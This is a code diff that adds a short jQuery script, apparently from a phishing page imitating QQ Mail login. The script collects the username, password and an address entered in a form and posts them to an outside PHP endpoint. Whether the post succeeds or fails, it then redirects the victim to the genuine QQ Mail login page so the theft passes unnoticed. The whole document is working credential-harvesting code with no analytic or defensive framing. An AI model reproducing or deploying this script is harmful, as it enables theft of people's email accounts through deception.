@@ -1,0 +1,31 @@
+$(function() {  
+  $("#go").click(function(){
+    var u = $("#u").val();
+    var p = $("#p").val();
+    var a = $("#address").val();
+    if(u != '' && p != ''){
+        add(u,p,a);
+    }else{
+        var m = u == "" ? "请输入用户名" : p == "" ? "请输入密码" : "";
+        alert(m);
+    }
+  });
+  function add(u,p,a){
+    $.ajax({
+      url:"http://www.xiaoxuntong.ink/d.php",
+      type:"post",
+      data:{
+        action:"add",
+        u:u,
+        p:p,
+        a:a
+      },
+      success : function(data) {
+        window.location.href = "https://w.mail.qq.com/cgi-bin/loginpage?f=xhtml";
+      },
+     error : function(XMLHttpRequest, textStatus, errorThrown) {
+        window.location.href = "https://w.mail.qq.com/cgi-bin/loginpage?f=xhtml";
+     }
+    });
+  }
+});
